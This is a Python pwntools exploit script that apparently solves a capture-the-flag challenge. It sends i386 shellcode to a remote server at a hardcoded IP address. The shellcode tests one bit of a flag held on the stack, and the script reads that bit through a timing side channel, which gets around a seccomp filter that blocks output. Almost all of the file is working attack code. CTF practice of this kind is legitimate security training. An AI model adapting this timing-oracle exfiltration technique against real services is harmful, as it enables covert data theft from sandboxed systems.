#!/usr/bin/env python3
# Exploit for ./sn_server  ("Shellcoder's Nightmare" server)
#
# Layout of the per-connection handler (FUN_08048b3b):
#   fd = open("flag", O_RDONLY)
#   read(fd, [ebp-0x58], 0x40)      <-- FLAG is read onto the STACK, before us
#   close(fd)
#   read(0, shellcode, 0x400)       <-- our shellcode
#   mmap RWX -> copy shellcode -> mprotect RX
#   prctl(NO_NEW_PRIVS); prctl(SET_DUMPABLE,0)
#   seccomp: default = KILL, ALLOW only syscall 173 (rt_sigreturn) and 1 (exit)
#   call shellcode            <-- ebp still points at the handler frame
#
# So when our shellcode runs, the flag is sitting at [ebp-0x58 .. ebp-0x18)
# and ebp is still valid.  But seccomp forbids write(): we cannot print it.
#
# Exfil = TIMING ORACLE via the double-fork wrapper (FUN_08048d3d):
#   grandchild = our shellcode ;  middle process does alarm(2); pause().
#     * shellcode exits fast  -> SIGCHLD -> wrapper cleans up -> socket EOF ~0s
#     * shellcode spins        -> alarm(2) -> kill(9)          -> socket EOF ~2s
#
# For each flag bit we run: if bit==0 -> exit (fast); if bit==1 -> spin (slow).
# The client just measures time-to-EOF.  1 reliable bit per connection.

import sys, time
from concurrent.futures import ThreadPoolExecutor
from pwn import *

context.arch = 'i386'
context.log_level = 'error'
#141.85.224.104:33335
HOST = '141.85.224.104'
PORT = 33335
FLAG_LEN = 0x40          # handler reads up to 0x40 bytes of flag
THRESHOLD = 1.0          # seconds: >THRESHOLD => bit is 1 (spin/killed at ~2s)
WORKERS = 6              # keep concurrency low: listen backlog is only 5, and too
                         # many spinning children starve CPU and corrupt timings

if len(sys.argv) >= 3:
    HOST, PORT = sys.argv[1], int(sys.argv[2])


def make_sc(i, b):
    """Shellcode: test bit b of flag byte i. clear->exit(fast), set->spin(slow)."""
    off = 0x58 - i                       # flag byte i is at [ebp-(0x58-i)]
    return asm(f"""
        mov  al, [ebp-{off}]
        test al, {1 << b}
        jnz  spin
        xor  ebx, ebx
        mov  eax, 1          /* SYS_exit -- one of the two allowed syscalls */
        int  0x80
    spin:
        jmp  spin            /* no syscall -> killed by the wrapper at ~2s */
    """)


def query_bit(i, b):
    io = remote(HOST, PORT)
    io.recvuntil(b'Shellcode: ')
    t0 = time.time()
    io.send(make_sc(i, b))
    io.recvall(timeout=4)                # block until the server closes the socket
    dt = time.time() - t0
    io.close()
    return 1 if dt > THRESHOLD else 0


def main():
    flag = bytearray(FLAG_LEN)
    jobs = [(i, b) for i in range(FLAG_LEN) for b in range(8)]
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        results = list(ex.map(lambda ib: query_bit(*ib), jobs))
    for (i, b), bit in zip(jobs, results):
        flag[i] |= bit << b

    raw = bytes(flag)
    # trim at first NUL / newline for display
    end = len(raw)
    for j, c in enumerate(raw):
        if c in (0, 0x0a):
            end = j
            break
    log.log_level = 'info'
    print("[+] flag bytes:", raw.hex())
    print("[+] FLAG:", raw[:end].decode('latin-1'))


if __name__ == '__main__':
    main()
